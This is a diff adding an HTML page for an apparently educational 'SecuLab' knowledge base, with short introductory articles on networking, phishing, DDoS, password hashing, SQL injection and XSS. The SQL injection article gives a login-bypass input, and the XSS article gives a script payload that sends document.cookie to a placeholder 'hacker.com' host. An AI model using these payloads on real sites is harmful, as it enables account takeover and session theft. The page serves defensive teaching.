@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SecuLab - Knowledge Base</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap-grid.min.css" rel="stylesheet">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <style>
+        :root { --black: #000000; --white: #FFFFFF; --gray: #f0f0f0; }
+        * { box-sizing: border-box; border-radius: 0px !important; }
+        body { background: var(--white); color: var(--black); font-family: 'Inter', system-ui, sans-serif; margin: 0; }
+        .uppercase { text-transform: uppercase; font-weight: 900; }
+        
+        /* Navbar */
+        nav { border-bottom: 2px solid var(--black); padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: white; z-index: 100;}
+        
+        /* Layout */
+        .docs-container { display: flex; min-height: calc(100vh - 70px); }
+        
+        /* Sidebar */
+        .sidebar { width: 320px; border-right: 2px solid var(--black); background: var(--white); display: flex; flex-direction: column; flex-shrink: 0;}
+        .sidebar-header { padding: 1.5rem; border-bottom: 2px solid var(--black); background: var(--black); color: var(--white); }
+        
+        .module-group { border-bottom: 2px solid var(--black); }
+        .module-title { width: 100%; text-align: left; padding: 1rem 1.5rem; background: var(--white); border: none; font-weight: 900; text-transform: uppercase; font-size: 1.1rem; cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-family: 'Inter', sans-serif;}
+        .module-title:hover { background: var(--gray); }
+        
+        /* Анимация стрелочек */
+        .caret-icon { transition: transform 0.15s ease-out; }
+        .caret-icon.rotated { transform: rotate(180deg); }
+
+        /* Логика выпадающего меню (Аккордеон) */
+        .sub-menu { display: none; flex-direction: column; border-top: 2px solid var(--black); background: #fafafa;}
+        .sub-menu.open { display: flex; } 
+        
+        .sub-menu button { text-align: left; padding: 0.8rem 1.5rem 0.8rem 2.5rem; border: none; border-bottom: 1px solid #ddd; background: none; font-family: monospace; font-size: 0.95rem; cursor: pointer; transition: 0.1s;}
+        .sub-menu button:hover { background: #e0e0e0; border-left: 4px solid var(--black); padding-left: calc(2.5rem - 4px); }
+        .sub-menu button.active-link { background: var(--black); color: var(--white); font-weight: bold; border-left: 4px solid #00FF00; padding-left: calc(2.5rem - 4px);}
+
+        /* Main Content */
+        .content-area { flex-grow: 1; padding: 3rem 5rem; background: var(--white); overflow-y: auto;}
+        
+        /* Тактическая анимация появления контента */
+        @keyframes terminal-reveal {
+            0% { opacity: 0; transform: translateX(-10px); }
+            100% { opacity: 1; transform: translateX(0); }
+        }
+        
+        .theory-article { display: none; }
+        .theory-article.active { display: block; animation: terminal-reveal 0.2s ease-out; } 
+        
+        .topic-id { font-family: monospace; font-size: 0.9rem; border: 2px solid var(--black); padding: 4px 8px; margin-bottom: 1rem; display: inline-block; font-weight: bold; background: var(--black); color: var(--white);}
+        .article-title { font-size: 3rem; margin-top: 0; margin-bottom: 1rem; letter-spacing: -1px;}
+        .content-box { border-left: 4px solid var(--black); padding-left: 2rem; margin-top: 2rem; font-size: 1.1rem; line-height: 1.6; color: #333;}
+        code { background: var(--black); color: var(--white); padding: 2px 6px; font-family: monospace; font-weight: normal; }
+        .source-ref { font-size: 0.85rem; color: #666; font-style: italic; margin-top: 3rem; border-top: 1px dashed var(--black); padding-top: 1rem;}
+    </style>
+</head>
+<body>
+
+    <nav>
+        <a href="/" style="text-decoration:none; color:black;" class="uppercase"><i class="ph-bold ph-shield-check"></i> SECULAB</a>
+        <a href="/scenarios" class="uppercase" style="color:black; font-weight:700; text-decoration:none; border: 2px solid black; padding: 5px 15px; transition: 0.2s;">BACK TO LAB</a>
+    </nav>
+
+    <div class="docs-container">
+        
+        <aside class="sidebar">
+            <div class="sidebar-header uppercase">
+                <h2 style="margin:0; font-size: 1.2rem;">Knowledge Base</h2>
+            </div>
+
+            <div class="module-group">
+                <button class="module-title">1. Networking <i class="ph-bold ph-caret-down caret-icon rotated"></i></button>
+                <div class="sub-menu open">
+                    <button class="nav-btn active-link" data-target="net-osi">1.1 The OSI Model</button>
+                    <button class="nav-btn" data-target="net-ports">1.2 TCP/IP & Ports</button>
+                    <button class="nav-btn" data-target="net-mac">1.3 IP vs MAC Addressing</button>
+                </div>
+            </div>
+
+            <div class="module-group">
+                <button class="module-title">2. Phishing & SE <i class="ph-bold ph-caret-down caret-icon"></i></button>
+                <div class="sub-menu">
+                    <button class="nav-btn" data-target="phish-intro">2.1 Social Engineering</button>
+                    <button class="nav-btn" data-target="phish-typo">2.2 Typosquatting</button>
+                    <button class="nav-btn" data-target="phish-headers">2.3 Email Header Analysis</button>
+                </div>
+            </div>
+
+            <div class="module-group">
+                <button class="module-title">3. DDoS Attacks <i class="ph-bold ph-caret-down caret-icon"></i></button>
+                <div class="sub-menu">
+                    <button class="nav-btn" data-target="ddos-intro">3.1 DoS vs DDoS</button>
+                    <button class="nav-btn" data-target="ddos-tcp">3.2 The 3-Way Handshake</button>
+                    <button class="nav-btn" data-target="ddos-syn">3.3 SYN Flood Mitigation</button>
+                </div>
+            </div>
+
+            <div class="module-group">
+                <button class="module-title">4. Cryptography <i class="ph-bold ph-caret-down caret-icon"></i></button>
+                <div class="sub-menu">
+                    <button class="nav-btn" data-target="crypto-hash">4.1 Hashing vs Encryption</button>
+                    <button class="nav-btn" data-target="crypto-salt">4.2 Salting Passwords</button>
+                </div>
+            </div>
+
+            <div class="module-group">
+                <button class="module-title">5. Web Security <i class="ph-bold ph-caret-down caret-icon"></i></button>
+                <div class="sub-menu">
+                    <button class="nav-btn" data-target="web-sql">5.1 SQL Injection (SQLi)</button>
+                    <button class="nav-btn" data-target="web-xss">5.2 Cross-Site Scripting (XSS)</button>
+                </div>
+            </div>
+        </aside>
+
+        <main class="content-area">
+
+            <article id="net-osi" class="theory-article active">
+                <span class="topic-id">MOD_01_A</span>
+                <h1 class="uppercase article-title">The OSI Model</h1>
+                <div class="content-box">
+                    <p>The Open Systems Interconnection (OSI) model is a conceptual framework created by the International Organization for Standardization (ISO). It standardizes the functions of a telecommunication system into seven distinct layers, enabling interoperability between diverse vendors.</p>
+                    <p>Understanding the complete stack is mandatory for isolating network anomalies and tracing attack vectors:</p>
+                    <ul>
+                        <li><strong>Layer 7 - Application:</strong> The interface for end-user network processes. Protocols: HTTP, HTTPS, SMTP, FTP, DNS. Attacks here include SQL Injection and XSS.</li>
+                        <li><strong>Layer 6 - Presentation:</strong> Responsible for data translation, formatting, and encryption/decryption. Protocols: TLS/SSL, ASCII, JPEG.</li>
+                        <li><strong>Layer 5 - Session:</strong> Establishes, manages, and terminates connections between applications. Protocols: NetBIOS, RPC.</li>
+                        <li><strong>Layer 4 - Transport:</strong> Ensures reliable or un-reliable end-to-end data delivery, utilizing port numbers to separate communication flows. Protocols: TCP (reliable, connection-oriented), UDP (fast, connectionless). Attacks: SYN Floods, UDP Floods.</li>
+                        <li><strong>Layer 3 - Network:</strong> Handles logical addressing and path determination (routing) across multiple networks. Protocols: IPv4, IPv6, ICMP, IPsec. Attacks: IP Spoofing, Ping of Death.</li>
+                        <li><strong>Layer 2 - Data Link:</strong> Manages node-to-node data transfer and physical addressing on the same local network (LAN). Protocols: Ethernet, ARP, VLANs (802.1Q). Attacks: MAC Spoofing, ARP Poisoning.</li>
+                        <li><strong>Layer 1 - Physical:</strong> The physical and electrical transmission of raw bits over cables, fiber, or RF signals. Hubs and repeaters operate here.</li>
+                    </ul>
+                    <div class="source-ref">Reference: ISO/IEC 7498-1 Standard & Cisco Networking Academy.</div>
+                </div>
+                </article>
+
+            <article id="net-ports" class="theory-article">
+                <span class="topic-id">MOD_01_B</span>
+                <h1 class="uppercase article-title">TCP/IP & Ports</h1>
+                <div class="content-box">
+                    <p>While an IP address identifies a specific machine on a network, a <strong>Port Number</strong> (a 16-bit unsigned integer) identifies a specific process or service running on that machine. The IANA (Internet Assigned Numbers Authority) divides ports into three categories: System (0-1023), User (1024-49151), and Dynamic (49152-65535).</p>
+                    <p>From a tactical defense perspective, SOC analysts must monitor the following critical system ports, as they represent the most common attack surfaces:</p>
+                    <ul>
+                        <li><code>Port 20/21 (FTP):</code> File Transfer Protocol. Unencrypted file transfer; highly vulnerable to credential sniffing.</li>
+                        <li><code>Port 22 (SSH):</code> Secure Shell. Used for encrypted remote administration. A primary target for brute-force attacks.</li>
+                        <li><code>Port 23 (Telnet):</code> Legacy remote administration. Transmits all data, including passwords, in plaintext. Must be disabled in modern networks.</li>
+                        <li><code>Port 25 (SMTP):</code> Simple Mail Transfer Protocol. Used for email routing; often exploited for spam relay and phishing.</li>
+                        <li><code>Port 53 (DNS):</code> Domain Name System. Operates primarily on UDP. Vulnerable to DNS Cache Poisoning and Amplification DDoS attacks.</li>
+                        <li><code>Port 80 (HTTP) & 443 (HTTPS):</code> Web traffic. HTTP is unencrypted, while HTTPS utilizes TLS at Layer 6 for secure communication.</li>
+                        <li><code>Port 445 (SMB):</code> Server Message Block. Used for Windows file sharing. Historically exploited by ransomware like WannaCry (via EternalBlue).</li>
+                        <li><code>Port 3389 (RDP):</code> Remote Desktop Protocol. Frequent target for ransomware operators to gain GUI access to Windows servers.</li>
+                    </ul>
+                    <div class="source-ref">Reference: IANA Service Name and Transport Protocol Port Number Registry.</div>
+                </div>
+            </article>
+
+            <article id="net-mac" class="theory-article">
+                <span class="topic-id">MOD_01_C</span>
+                <h1 class="uppercase article-title">IP vs MAC Addressing</h1>
+                <div class="content-box">
+                    <p>Network communication relies on two primary types of addresses operating at different layers of the OSI model:</p>
+                    <p><strong>1. MAC Address (Media Access Control) - Layer 2:</strong><br>
+                    A physical, permanent address assigned to a Network Interface Card (NIC) by the manufacturer. It is used for local delivery of frames within the same LAN. Format: <code>00:1A:2B:3C:4D:5E</code>.</p>
+                    <p><strong>2. IP Address (Internet Protocol) - Layer 3:</strong><br>
+                    A logical address assigned by a network administrator or DHCP. It is used for routing packets across different networks (the Internet). Format: <code>192.168.1.5</code>.</p>
+                    <p>The Address Resolution Protocol (ARP) acts as the bridge, translating Layer 3 IP addresses into Layer 2 MAC addresses.</p>
+                </div>
+            </article>
+
+            <article id="phish-intro" class="theory-article">
+                <span class="topic-id">MOD_02_A</span>
+                <h1 class="uppercase article-title">Social Engineering</h1>
+                <div class="content-box">
+                    <p>Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. Unlike technical hacking, it exploits human cognitive biases rather than software flaws.</p>
+                    <p><strong>Phishing</strong> is the most common form of social engineering. It typically involves:</p>
+                    <ul>
+                        <li><strong>Authority:</strong> Impersonating a CEO, IT support, or law enforcement.</li>
+                        <li><strong>Urgency/Fear:</strong> "Your account will be suspended in 24 hours if you do not click here."</li>
+                        <li><strong>Curiosity:</strong> "View the attached salary document."</li>
+                    </ul>
+                    <p>Advanced adversaries use <em>Spearphishing</em> (highly targeted attacks against specific individuals) to bypass perimeter security.</p>
+                    <div class="source-ref">Reference: MITRE ATT&CK Framework (Technique T1566: Phishing).</div>
+                </div>
+            </article>
+
+            <article id="phish-typo" class="theory-article">
+                <span class="topic-id">MOD_02_B</span>
+                <h1 class="uppercase article-title">Typosquatting</h1>
+                <div class="content-box">
+                    <p>Typosquatting (also known as URL hijacking) is a form of cybersquatting which relies on mistakes such as typographical errors made by Internet users when inputting a website address into a web browser.</p>
+                    <p>Attackers register domains that look visually identical to legitimate enterprise domains. Common techniques include:</p>
+                    <ul>
+                        <li><strong>Omission:</strong> <code>paypal.com</code> vs <code>paypl.com</code></li>
+                        <li><strong>Substitution:</strong> Replacing a lowercase 'L' with a capital 'I' or the number '1' (e.g., <code>g00gle.com</code> or <code>paypaI.com</code>).</li>
+                        <li><strong>TLD swapping:</strong> <code>microsoft.com</code> vs <code>microsoft.co</code></li>
+                    </ul>
+                    <p>Identifying these requires strict visual inspection or automated DNS filtering solutions.</p>
+                    <div class="source-ref">Reference: CISA Guidelines.</div>
+                </div>
+            </article>
+
+            <article id="phish-headers" class="theory-article">
+                <span class="topic-id">MOD_02_C</span>
+                <h1 class="uppercase article-title">Email Header Analysis</h1>
+                <div class="content-box">
+                    <p>The "From" field displayed in a standard email client can be easily forged (spoofed) because the underlying protocol, SMTP, lacks built-in authentication.</p>
+                    <p>To verify the true origin of an email, analysts must inspect the raw email headers:</p>
+                    <ul>
+                        <li><strong>Received:</strong> Shows the actual IP addresses of the mail servers that relayed the message.</li>
+                        <li><strong>Return-Path:</strong> The hidden address where bounce messages are sent, often revealing the attacker's true domain.</li>
+                    </ul>
+                    <p>Modern defenses rely on protocols like SPF (Sender Policy Framework) and DMARC to prevent domain spoofing automatically.</p>
+                </div>
+            </article>
+
+            <article id="ddos-intro" class="theory-article">
+                <span class="topic-id">MOD_03_A</span>
+                <h1 class="uppercase article-title">DoS vs DDoS</h1>
+                <div class="content-box">
+                    <p>A <strong>Denial-of-Service (DoS)</strong> attack aims to shut down a machine or network, making it inaccessible to its intended users. It achieves this by flooding the target with traffic or sending it information that triggers a crash.</p>
+                    <p>A <strong>Distributed Denial-of-Service (DDoS)</strong> attack takes this further by utilizing multiple compromised computer systems (a Botnet) as sources of attack traffic. Devices in a botnet can include computers, IoT devices, and servers infected with malware.</p>
+                    <p>Because the incoming traffic flooding the victim originates from many different sources, it is impossible to stop the attack simply by blocking a single IP address.</p>
+                    <div class="source-ref">Reference: Cloudflare Learning Center - DDoS Attacks.</div>
+                </div>
+            </article>
+
+            <article id="ddos-tcp" class="theory-article">
+                <span class="topic-id">MOD_03_B</span>
+                <h1 class="uppercase article-title">The 3-Way Handshake</h1>
+                <div class="content-box">
+                    <p>Before a client and a server can exchange data over TCP (Transmission Control Protocol), they must establish a connection. This is done via a 3-step process:</p>
+                    <ol>
+                        <li><strong>SYN:</strong> The client sends a packet with the <code>SYN</code> (Synchronize) flag to the server to initiate the connection.</li>
+                        <li><strong>SYN-ACK:</strong> The server acknowledges the request by sending back a packet with both the <code>SYN</code> and <code>ACK</code> (Acknowledgment) flags. The server allocates memory for this pending connection.</li>
+                        <li><strong>ACK:</strong> The client responds with an <code>ACK</code> flag. The connection is now ESTABLISHED.</li>
+                    </ol>
+                    <p>This mechanism ensures reliability, but its requirement to allocate server memory at step 2 makes it vulnerable to exploitation.</p>
+                    <div class="source-ref">Reference: IETF RFC 793 (Transmission Control Protocol).</div>
+                </div>
+            </article>
+
+            <article id="ddos-syn" class="theory-article">
+                <span class="topic-id">MOD_03_C</span>
+                <h1 class="uppercase article-title">SYN Flood Mitigation</h1>
+                <div class="content-box">
+                    <p>A <strong>SYN Flood</strong> is a volumetric DDoS attack that exploits the TCP 3-Way Handshake. The attacker sends thousands of <code>SYN</code> requests to the server, often using spoofed IP addresses.</p>
+                    <p>The server replies with <code>SYN-ACK</code> and waits for the final <code>ACK</code>. Because the attacker never sends the <code>ACK</code>, the server is left with thousands of "half-open" connections. Once the server's connection queue fills up, it cannot respond to legitimate traffic.</p>
+                    <p><strong>Mitigation Techniques:</strong></p>
+                    <ul>
+                        <li><strong>SYN Cookies:</strong> The server hashes the connection details and sends them in the SYN-ACK, without allocating memory until the final ACK is received.</li>
+                        <li><strong>Timeout adjustments:</strong> Reducing the time the server waits for an ACK before dropping the half-open connection.</li>
+                    </ul>
+                </div>
+            </article>
+
+            <article id="crypto-hash" class="theory-article">
+                <span class="topic-id">MOD_04_A</span>
+                <h1 class="uppercase article-title">Hashing vs Encryption</h1>
+                <div class="content-box">
+                    <p>A common misconception is treating hashing and encryption as the same thing. They serve entirely different purposes in cryptography.</p>
+                    <p><strong>Encryption</strong> is a two-way function. Data is scrambled using a key, and can be decrypted back to its original state using the correct key (e.g., AES, RSA).</p>
+                    <p><strong>Hashing</strong> is a one-way mathematical function. It takes an input of any size and produces a fixed-size string of characters (e.g., SHA-256). You cannot "decrypt" a hash back to its original text. It is used to verify data integrity and store passwords safely.</p>
+                </div>
+            </article>
+
+            <article id="crypto-salt" class="theory-article">
+                <span class="topic-id">MOD_04_B</span>
+                <h1 class="uppercase article-title">Salting Passwords</h1>
+                <div class="content-box">
+                    <p>If two users have the same password (e.g., <code>password123</code>), their hashes will be identical. Attackers exploit this using <strong>Rainbow Tables</strong> — massive pre-computed databases of hashes for common passwords.</p>
+                    <p>To mitigate this, systems use a <strong>Salt</strong>. A salt is a unique, random string of characters added to each user's password before hashing it: <code>Hash(Password + Salt)</code>.</p>
+                    <p>Even if two users have the same password, their unique salts ensure their final stored hashes are completely different, rendering Rainbow Tables useless.</p>
+                </div>
+            </article>
+
+            <article id="web-sql" class="theory-article">
+                <span class="topic-id">MOD_05_A</span>
+                <h1 class="uppercase article-title">SQL Injection (SQLi)</h1>
+                <div class="content-box">
+                    <p>SQL Injection occurs when an application improperly sanitizes user input before sending it to the database query.</p>
+                    <p>For example, an attacker might enter <code>' OR '1'='1</code> into a login field. If the backend code looks like <code>SELECT * FROM users WHERE username = '$input'</code>, the query becomes:</p>
+                    <p><code>SELECT * FROM users WHERE username = '' OR '1'='1'</code></p>
+                    <p>Since 1=1 is always true, the database returns the first user record (usually the Admin), granting the attacker unauthorized access.</p>
+                    <div class="source-ref">Reference: OWASP Top 10 (A03:2021-Injection).</div>
+                </div>
+            </article>
+
+            <article id="web-xss" class="theory-article">
+                <span class="topic-id">MOD_05_B</span>
+                <h1 class="uppercase article-title">Cross-Site Scripting (XSS)</h1>
+                <div class="content-box">
+                    <p>XSS allows an attacker to inject malicious client-side JavaScript into web pages viewed by other users. This bypasses the Same-Origin Policy.</p>
+                    <p>If a vulnerable forum allows raw HTML in comments, an attacker can post: <code>&lt;script&gt;fetch('http://hacker.com/?cookie=' + document.cookie)&lt;/script&gt;</code>.</p>
+                    <p>When an admin views that comment, the script executes in their browser, stealing their session cookie and sending it to the attacker's server.</p>
+                </div>
+            </article>
+
+        </main>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            
+            // 1. logic for the menu toggles
+            const moduleTitles = document.querySelectorAll('.module-title');
+            
+            moduleTitles.forEach(title => {
+                title.addEventListener('click', () => {
+                    const subMenu = title.nextElementSibling;
+                    const caret = title.querySelector('.caret-icon');
+                    
+                    subMenu.classList.toggle('open');
+                    caret.classList.toggle('rotated');
+                });
+            });
+
+            // 2. selects topics and shows content
+            const navButtons = document.querySelectorAll('.nav-btn');
+            const articles = document.querySelectorAll('.theory-article');
+
+            navButtons.forEach(button => {
+                button.addEventListener('click', (e) => {
+                    navButtons.forEach(btn => btn.classList.remove('active-link'));
+                    articles.forEach(article => article.classList.remove('active'));
+                    
+                    e.target.classList.add('active-link');
+                    
+                    const targetId = e.target.getAttribute('data-target');
+                    document.getElementById(targetId).classList.add('active');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
